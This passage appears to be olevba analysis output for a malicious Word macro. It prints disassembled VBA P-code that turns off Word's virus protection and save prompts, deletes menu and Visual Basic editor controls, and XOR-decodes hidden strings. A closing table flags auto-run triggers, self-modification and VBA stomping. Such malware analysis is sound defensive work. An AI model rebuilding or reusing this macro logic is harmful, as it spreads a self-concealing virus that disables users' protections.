' 	Label S19978rl5Vx4bb 
' Line #360:
' 	StartForVariable 
' 	Ld K9Bm6t353BaD 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	FnLen 
' 	For 
' Line #361:
' 	Ld T7SAs7h1CF0wvWqQ 
' 	Ld K9Bm6t353BaD 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld C5KU88q3NKNNdJ3fV 
' 	Ld K9Bm6t353BaD 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Xor 
' 	ArgsLd Chr$ 0x0001 
' 	ArgsLd Asc 0x0001 
' 	Ld Q8vOoxI4KL52qbLbyo7P 
' 	Ld K9Bm6t353BaD 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Xor 
' 	ArgsLd Chr$ 0x0001 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	Ld K9Bm6t353BaD 
' 	LitDI2 0x0001 
' 	Mid 
' Line #362:
' 	QuoteRem 0x0000 0x0043 "21.16756   1601.081    1403.076    2.163505    116.0334    2717.263"
' Line #363:
' 	QuoteRem 0x0000 0x0013 "22.1482    5478.748"
' Line #364:
' 	StartForVariable 
' 	Ld K9Bm6t353BaD 
' 	EndForVariable 
' 	NextVar 
' Line #365:
' 	QuoteRem 0x0000 0x0073 "1587.955   6101.258    860.6987    5283.946    5409.948    409.3118    2793.221    2052.896    5535.103    3098.799"
' Line #366:
' 	Return 
' Line #367:
' 	Label QPDinD0UBAAIK759OTu 
' Line #368:
' 	QuoteRem 0x0000 0x0013 "1159.717   6785.311"
' Line #369:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St I7j1A2ejItuv7TLM7r 
' Line #370:
' 	StartForVariable 
' 	Ld K9Bm6t353BaD 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x000A 
' 	Add 
' 	For 
' Line #371:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	SelectCase 
' Line #372:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld I7j1A2ejItuv7TLM7r 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St I7j1A2ejItuv7TLM7r 
' Line #373:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld I7j1A2ejItuv7TLM7r 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0030 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St I7j1A2ejItuv7TLM7r 
' Line #374:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld I7j1A2ejItuv7TLM7r 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0061 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St I7j1A2ejItuv7TLM7r 
' Line #375:
' 	EndSelect 
' Line #376:
' 	StartForVariable 
' 	Ld K9Bm6t353BaD 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld EJI3827ImdS1 
' 	Ld I7j1A2ejItuv7TLM7r 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo QPDinD0UBAAIK759OTu 
' 	EndIf 
' Line #377:
' 	Return 
' Line #378:
' 	GoTo N3EnH2UiKNr 
' Line #379:
' 	QuoteRem 0x0000 0x006F "1704.989   341.7881    8.322904    2941.062    773.2975    3586.169    2602.95 3072.792    4229.927    2473.123"
' Line #380:
' 	Label Yc79VMMCiI8p8 
' Line #381:
' 	QuoteRem 0x0000 0x0053 "147.4529   1809.53 40.98886    2899.665    2888.289    4845.323    1543.02 1197.828"
' Line #382:
' 	GoSub QPDinD0UBAAIK759OTu 
' Line #383:
' 	LitDI2 0x0000 
' 	Ld I7j1A2ejItuv7TLM7r 
' 	FnLen 
' 	Sub 
' 	St I31a6731A3TPTQpu 
' Line #384:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #385:
' 	Ld I31a6731A3TPTQpu 
' 	Ld I7j1A2ejItuv7TLM7r 
' 	FnLen 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld EJI3827ImdS1 
' 	Ld M32jk4AlYbb 
' 	FnInStr3 
' 	St I31a6731A3TPTQpu 
' Line #386:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #387:
' 	Ld EJI3827ImdS1 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #388:
' 	QuoteRem 0x0000 0x0067 "2050.301   3957.259    309.4777    3007.529    1147.96 3957.27 2068.54 1316.309    1204.881    3694.421"
' Line #389:
' 	Ld EJI3827ImdS1 
' 	Ld EJI3827ImdS1 
' 	FnLen 
' 	Ld I31a6731A3TPTQpu 
' 	Ld M32jk4AlYbb 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	ArgsLd Right 0x0002 
' 	St B8LpM131ei639bf284e5 
' Line #390:
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld I7j1A2ejItuv7TLM7r 
' 	Concat 
' 	Ld B8LpM131ei639bf284e5 
' 	Concat 
' 	St EJI3827ImdS1 
' Line #391:
' 	EndIfBlock 
' Line #392:
' 	Loop 
' Line #393:
' 	QuoteRem 0x0000 0x0027 "266.4  2432.265    1838.935    1542.904"
' Line #394:
' 	Return 
' Line #395:
' 	Label N3EnH2UiKNr 
' Line #396:
' 	Label Vu8rWFA9Ej2 
' Line #397:
' 	OnError (Resume Next) 
' Line #398:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #399:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith AllowFastSave 
' Line #400:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith BackgroundSave 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith CreateBackup 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveInterval 
' Line #401:
' 	EndWith 
' Line #402:
' 	Dim 
' 	VarDefn EknCU56L8y92sKUA (As Variant)
' Line #403:
' 	LitDI2 0x7541 
' 	LitDI2 0x02EF 
' 	LitDI2 0x031D 
' 	LitDI2 0x020A 
' 	LitDI2 0x0150 
' 	LitDI2 0x755D 
' 	ArgsArray Array 0x0006 
' 	St EknCU56L8y92sKUA 
' Line #404:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	For 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld I31a6731A3TPTQpu 
' 	ArgsLd EknCU56L8y92sKUA 0x0001 
' 	ParamNamed ID 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd FindControl 0x0001 
' 	Set Xu17GqW4w6tAsta33061UC1nc1n 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Xu17GqW4w6tAsta33061UC1nc1n 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	Ld Xu17GqW4w6tAsta33061UC1nc1n 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	NextVar 
' Line #405:
' 	QuoteRem 0x0000 0x0013 "2750.247   123.1063"
' Line #406:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd CommandBars 
' 	With 
' Line #407:
' 	SetStmt 
' 	LitDI2 0x03A2 
' 	ParamNamed ID 
' 	ArgsMemLdWith FindControl 0x0001 
' 	Set Xu17GqW4w6tAsta33061UC1nc1n 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Xu17GqW4w6tAsta33061UC1nc1n 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	Ld Xu17GqW4w6tAsta33061UC1nc1n 
' 	ArgsMemCall Delete 0x0000 
' Line #408:
' 	SetStmt 
' 	LitDI2 0x020A 
' 	ParamNamed ID 
' 	ArgsMemLdWith FindControl 0x0001 
' 	Set Xu17GqW4w6tAsta33061UC1nc1n 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Xu17GqW4w6tAsta33061UC1nc1n 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	Ld Xu17GqW4w6tAsta33061UC1nc1n 
' 	ArgsMemCall Delete 0x0000 
' Line #409:
' 	EndWith 
' Line #410:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #411:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith ScreenUpdating 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	MemStWith ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' 	BoS 0x0000 
' 	Ld wdAlertsNone 
' 	MemStWith DisplayAlerts 
' Line #412:
' 	QuoteRem 0x0000 0x001F "903.564    1037.006    1519.289"
' Line #413:
' 	LitStr 0x000C "‘üžóÒð‚ª‹»Ñï"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	ArgsMemLdWith CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	ArgsMemLdWith CommandBars 0x0001 
' 	MemSt Visible 
' Line #414:
' 	LitStr 0x0005 "“ú‚êÀ"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	MemLdWith VBE 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #415:
' 	EndWith 
' Line #416:
' 	QuoteRem 0x0000 0x005B "814.9865   1934.605    5549.388    3473.404    567.2723    3380.864    567.8029    5166.879"
' Line #417:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #418:
' 	LitStr 0x002F "�Þ¨ßìß÷º¸�öØþ™¦ÿ�–‚«÷ÍÉöÂÒÁ¬çÌõÞóä�Ü¿Þç€¬½Ô‘Âúê"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #419:
' 	LitStr 0x001F "öµÜ¦‚¼“ÈÛè‰¬�ìÄšþêàä ™�·�—¬Á¿�¶"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St B8LpM131ei639bf284e5 
' Line #420:
' 	LitStr 0x000E "„ú‰ãñýÁƒ©§ÔãÓ¿"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld B8LpM131ei639bf284e5 
' 	LitStr 0x0000 ""
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #421:
' 	LitStr 0x000E "„ú‰ãõóÐ�©§ÔãÓ¿"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld B8LpM131ei639bf284e5 
' 	LitStr 0x0000 ""
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #422:
' 	EndWith 
' Line #423:
' 	QuoteRem 0x0000 0x0037 "4924.887   3275.852    3435.824    3534.776    835.7153"
' Line #424:
' 	Return 
' Line #425:
' 	Label KQhb5kf52d9Q90ve2 
' Line #426:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

